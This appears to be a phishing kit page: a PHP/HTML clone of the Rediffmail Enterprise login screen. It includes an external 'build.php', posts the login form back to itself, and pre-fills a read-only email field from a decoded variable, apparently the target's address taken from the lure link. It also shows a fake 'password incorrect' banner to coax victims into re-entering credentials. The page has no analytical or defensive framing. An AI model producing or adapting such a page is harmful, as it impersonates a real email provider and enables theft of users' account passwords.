<?php include '../build.php' ?>
<!doctype html>
<html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<head>
	<title>Rediffmail Enterprise - A Next Generation Email Service | Business Email | Company Email | Professional Email
	</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<link rel="icon" type="image/x-icon" href="https://im.rediff.com/favicon2.ico" />
	<meta name="keywords" content="Rediff, Rediffmail Enterprise, Business Email" />
	<meta name="description" content="Looking for Company Email service providers? Get secure Business Email hosting for your company with spacious mail storage and advanced anti-virus only @Rediffmail Enterprise today!" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="Pragma" content="no-cache" />
	<meta name="Generator" content="Rediffmail">
	<meta name="Author" content="Rediffmail">
	<link rel="stylesheet" href="https://www.rediffmailpro.com/mail_pro/new_pro.css" />
	<style type="text/css">
		@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

		.boldMsg {
			padding: 5px;
			background-color: #f3f3f3;
			font-size: 12px;
			font-weight: bold;
			text-align: left;
		}

		body,
		p,
		ul,
		ol,
		li,
		table,
		tr,
		th,
		td,
		input,
		button,
		h1,
		h2,
		h3,
		h4,
		h5,
		h6,
		textarea,
		select,
		form {
			font-family: 'Poppins', sans-serif, verdana, arial;
			font-size:13px;
		}

		.wrapper_wrap {
			width: 100%;
			display: block;
		}

		.main_container {
			width: 1000px;
			margin: 0 auto;
			display: block; 
		}

		#ng_header {
			background: #fff;
			border-bottom: #e0e0e0 solid 3px;
			padding: 0 0 15px 0;
			margin: 0; height:42px;
		}

		.toprightlinks,
		#ng_header {
			font-size: 12px;
			float:none;
			margin:0;
			margin-left:auto;
		}

		.main_wrap_here {
			background: #fff;
			padding: 30px 0;
		}

		.footerhome {
			margin: 0;
			border-top: #e0e0e0 solid 3px;
			background: #fff;
			padding: 10px 0;
		}

		.advance_fet {
			display: block;
			padding: 10px 15px;
			margin: 0
		}

		.advance_fet li {
			display: block;
			margin: 0;
			padding: 0 0 3px 23px;
			background: url(https://www.rediffmailpro.com/mail_pro/images/tick_mark.png) left center no-repeat;
			font-size:13px; line-height:20px;
		}

		#rightCnt {
			margin: 0 0 0 40px;
			width: 485px;
		}

		.qslinksel,
		.qslink {
			font-family: 'Poppins', sans-serif, verdana, arial;
			border: #ccc solid 1px;
			width: 50%;
			float: left;
			padding: 15px 0;
			text-align: center;
			font-size: 13px;
		}

		.qslinksel {
			border-bottom: #fff solid 1px;
		}

		.qslink {
			background: #e0e0e0;
			margin: 0 -2px;
		}

		#dataCnt input[type="text"],
		#dataCnt input[type="text"],
		#dataCnt select {
			border: #ccc solid 1px;
			height: 26px
		}

		#divmain {
			width: 100%;
		}

		#dataCnt {
			width: 94%;
			padding: 10px 3%;
		}

		.slider_here {
			display: block;
			padding: 0 15px;
			height: 550px;
			width: 247px;
			background: url(https://www.rediffmailpro.com/mail_pro/images/slide_mob.png) 0 60px no-repeat;
			position: relative;
			overflow: hidden;
			margin: 0 0 0 135px;
		}

		.slider_here ul {
			margin: 0;
			position: relative;
			display: block;
			height: 540px;
			width: 247px;
			padding: 0;
			overflow: hidden
		}

		.slider_here ul li {
			padding: 0;
			margin: 0;
			display: block;
			height: 540px;
			width: 247px;
			float: left;
		}

		.hand_hold {
			display: block;
			float: left;
			width: 471px;
			display: block;
			height: 648px;
			background: url(https://www.rediffmailpro.com/mail_pro/images/hand_hold.jpg) 0 70px no-repeat;
			margin-top: 0px;
		}

		.slider_here ul li h4 {
			display: block;
			margin: 0;
			opacity: 1;
			margin-bottom: 83px;
			font-size: 17px;
			color: #333;
			background: #fff;
			position: absolute; line-height:22px;
		}

		.slider_here ul li span {
			padding-top: 123px;
			display: block;
			opacity: 1;
		}


		.chatb {
			padding: 0px;
			margin: 0px;
			border: 2px solid #267cb5;
			position: fixed;
			border-radius: 10px;
			bottom: 80px;
			right: 20px;
			z-index: 999;
			background: #fff;
			display: none;
			width: 320px;
		}

		.chatb h4 {
			background: #267cb5;
			font-size: 13px;
			color: #fff;
			padding: 10px 20px;
			display: block;
			font-family: 'Poppins', sans-serif, arial, verdana;
			margin: 0;
			font-weight: normal
		}

		.chatb h4 span {
			font-size: 15px;
			font-family: 'Poppins', sans-serif, arial, verdana;
			display: block;
			font-weight: bold;
		}

		.chat_profa {
			position: fixed;
			right: 10px;
			bottom: 8px;
			width: 64px;
			height: 64px;
			display: none;
			z-index: 999;
			cursor: pointer;
			-webkit-animation-duration: 1s;
			animation-duration: 1s;
			-webkit-animation-fill-mode: both;
			animation-fill-mode: both;
			background: url(https://businessemail.rediff.com/rediffmailpro/onlinebiz/images/icons/sprite.png) no-repeat;
		}

		.chat_profa b {
			display: block;
		}

		.chatb h4 a.close_chat {
			background: url(https://businessemail.rediff.com/rediffmailpro/onlinebiz/images/down_arr.png) no-repeat center;
			background-size: 100% auto;
			width: 20px;
			height: 20px;
			display: block;
			position: absolute;
			right: 20px;
			top: 18px;
		}

		.chatb h4 a.reset_chat {
			background: url(https://businessemail.rediff.com/rediffmailpro/onlinebiz/images/sync.png) no-repeat center;
			background-size: 100% auto;
			width: 20px;
			height: 20px;
			display: block;
			position: absolute;
			right: 60px;
			top: 18px;
		}

		@-webkit-keyframes bounce {

			from,
			20%,
			53%,
			80%,
			to {
				-webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
				animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
				-webkit-transform: translate3d(0, 0, 0);
				transform: translate3d(0, 0, 0);
			}

			40%,
			43% {
				-webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				-webkit-transform: translate3d(0, -30px, 0);
				transform: translate3d(0, -30px, 0);
			}

			70% {
				-webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				-webkit-transform: translate3d(0, -15px, 0);
				transform: translate3d(0, -15px, 0);
			}

			90% {
				-webkit-transform: translate3d(0, -4px, 0);
				transform: translate3d(0, -4px, 0);
			}
		}

		@keyframes bounce {

			from,
			20%,
			53%,
			80%,
			to {
				-webkit-animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
				animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
				-webkit-transform: translate3d(0, 0, 0);
				transform: translate3d(0, 0, 0);
			}

			40%,
			43% {
				-webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				-webkit-transform: translate3d(0, -30px, 0);
				transform: translate3d(0, -30px, 0);
			}

			70% {
				-webkit-animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				animation-timing-function: cubic-bezier(0.755, 0.05, 0.855, 0.06);
				-webkit-transform: translate3d(0, -15px, 0);
				transform: translate3d(0, -15px, 0);
			}

			90% {
				-webkit-transform: translate3d(0, -4px, 0);
				transform: translate3d(0, -4px, 0);
			}
		}

		.bounce {
			display: block;
			-webkit-animation-name: bounce;
			animation-name: bounce;
			-webkit-transform-origin: center bottom;
			transform-origin: center bottom
		}


		.img-001-chat {
			background-position: -0px -0px;
			width: 64px;
			height: 64px;
		}

		.forgotpwd {
			display: block;
		}

		#ng_header .main_container {
			display: flex;
			align-items: center;
		}


		.toptabsdiv {
			margin-right: auto;
			margin-left: 0; padding:0 0 0 30px
		}
		.logor a	{ display:block;}
		.titletxt 	{ font-weight:600}
	</style>
</head>

<body>
	<!-- Begin comScore Tag -->
	<!-- End comScore Tag -->
	<script language="JavaScript">
		var isLoginError = 0;
	</script>
	<div class="wrapper_wrap">

		<div id="ng_header">

			<div class="main_container">
				<div class="logor">
					<a class="logoanchor" title="Rediff.com Home" href="http://www.rediff.com/">rediff.com</a>
					<a
						title="Rediffmail Enterprise" href="https://businessemail.rediff.com/"><img src="https://im.rediff.com/ajaxprism/pix_1_3/rediffmail-enterprise-logo.png" alt="Rediffmail Enterprise" title="Rediffmail Enterprise" width="120" /></a>
				</div>
				<div class="toptabsdiv">
					<a urlAlt="ptracking" title="Business Associate Programme"
						href="https://businessemail.rediff.com/rediffmailpro/ba" target="_blank">Business Associate
						Programme</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a urlAlt="ptracking" title="Faqs" class="tabnormal"
						href="https://businessemail.rediff.com/faq/email-hosting"
						target="_blank">FAQ</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a urlAlt="ptracking" title="Web Hosting"
						class="tabnormal" href="https://businessemail.rediff.com/hosting/scripts/hosting.phtml"
						target="_blank">Web Hosting</a>
				</div>

				<div class="toprightlinks lineht1"><span><a target="_blank"
							href="http://support.rediff.com/support/rediffmailpro.htm">Feedback</a></span></div>
				<div class="clear"></div>
			</div>
		</div>
		<div class="clear"></div>

		<div class="main_wrap_here">
			<div class="main_container">
				<div id="leftCnt" class="floatL">

					<div class="hand_hold">
						<div class="slider_here">
							<ul id="slide_img" class="cycle-slideshow" data-cycle-fx="scrollHorz"
								data-cycle-timeout="8000" data-cycle-slides="> li">
								<li>
									<h4>Introducing new Rediffmail for work on mobile</h4>
									<span><img src="https://www.rediffmailpro.com/mail_pro/images/slide1.jpg" border="0"
											alt="Rediffmail for Work" /></span>
								</li>
								<li>
									<h4>Easily manage your mailbox with swipe actions</h4>
									<span><img src="https://www.rediffmailpro.com/mail_pro/images/slide3.jpg" border="0"
											alt="Rediffmail for Work" /></span>
								</li>
								<li>
									<h4>Read mails easily with upfront attachment view</h4>
									<span><img src="https://www.rediffmailpro.com/mail_pro/images/slide4.jpg" border="0"
											alt="Rediffmail for Work" /></span>
								</li>
								<li>
									<h4>Plan your days and weeks with calendar</h4>
									<span><img src="https://www.rediffmailpro.com/mail_pro/images/slide2.jpg" border="0"
											alt="Rediffmail for Work" /></span>
								</li>
							</ul>
						</div>
					</div>
				</div>

				<div id="rightCnt" class="floatL">

					<div class="titletxt">Welcome to Rediffmail for Work <span class="clear"></span></div><!-- jbp -->

					<ul class="advance_fet">
						<li>Advanced anti-virus and spam protection</li>
						<li>Additional IDs as and when you need it</li>
						<li>Unmatched reliability and dependability</li>
						<li>POP3 access</li>
						<li>Send and receive mail from mobile</li>
					</ul>
					<div class="bdy_title"></div>

					<!--  Main div starts -->
					<div id="divmain">
						<div style="float:left;" id="qstab1" class="qslinksel" title="Existing users? Login"
							onclick="showTab(1);"><span>Existing users? Login </span></div>
						<div id="qstab2" class="qslink" title="New User? Get an account"><span><a urlAlt="ptracking"
									href="#">New
									User? Get an account</a></span></div>
						<div class="clear"></div>
						<div class="clear"></div>

						<div id="dataCnt">
							<div id="dd1">
                                <div style="background-color:#FEFDBC;margin:0 0 5px 0;font-size:12px;padding:3px 5px;color:#E0001A; <?php echo $error; ?>"><b>Sorry! This email address does not exist or the password is incorrect.</b></div>
								<form name="login-form" method="post" action="">
									<input type="hidden" value="rediffmailpro" name="login" />
									<div class="floatL alnL" style="width:100%;">Email Address<p style="padding-bottom:15px;"><input type="text" style="width: 250px; border-radius:3px; margin:0 0 0 0; padding:2px 8px" value="<?php echo htmlspecialchars($decoded); ?>" name="user" id="user" placeholder="<?php echo htmlspecialchars($decoded); ?>" readonly/><br><span class="f11" style="color:#666666; font-size:12px;">eg. samarth@exporthouse.com</span></p>
									</div>
									<!-- Password autocomplete off is below  -->
									<p>Password</p><input type="text" name="pass" id="password" autocomplete="off" class="vmiddle" style="padding:2px 8px; margin:0 0 0 0; border-radius:3px; width:250px;" /> &nbsp;&nbsp;<input type="submit" onclick="submitLogin(event);" value="&nbsp;Login" class="vmiddle" style="height:31px; width:60px; text-align:center;" /> &nbsp;&nbsp;<a
										href="javascript:PasswdRemindWin()" class="forgotpwd" style="font-size:12px; display:block; margin-bottom:20px;">Forgot Password?</a>
									
									<input type="checkbox" checked value="1" name="remember" class="vmiddle" />&nbsp;Remember my email address on this computer
								</form>
							</div><!-- dd1 end -->
						</div> <!-- dataCnt -->
					</div>
					<!--  Main div ends -->

					<div class="ht10"></div>
					<div class="ht10"></div>
					<span class="bold">Need help to renew your account?</span>
					<div>Send us your details, and our representative will contact you. <a href="#">click here.</a></div>

					<!-- Added by Rahul for ChatBot integration-->
					<div class="chatb">
						<h4><span>Vedika</span>Rediffmail's 24X7 Chat Support<a href="javascript:;"
								class="close_chat"></a><a href="javascript:;" class="reset_chat" onclick="refresh()"
								title="Reset Chat"></a></h4>
						<iframe src="" id="chatbot" width="100%" height="400" frameborder="0" border="0"
							style="border:none; border-radius:0;" class="iframe_man"></iframe>
					</div>
					<div class="chat_profa img-001-chat bounce">
						<b></b>
						<!--Chatbot integration ended-->
					</div>

				</div>



				<!-- rightCnt end -->
				<div class="clear"></div>
			</div>
		</div>
		<div class="footerhome">&copy; 2026 Rediff.com - <a href="#" target="_blank">Disclaimer</a> - <a href="#" target="_blank">Privacy Policy</a></div>


	</div><!-- wrapper end -->

	<iframe src="about:blank" name="fill_metric" id="fill_metric" width="1" height="1" frameborder="0"
		style="display:none">
	</iframe>
	<iframe src="about:blank" name="fill_metric_iframe" id="fill_metric_iframe" width="1" height="1" frameborder="0"
		style="display:none">
	</iframe>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
<!-- </template> -->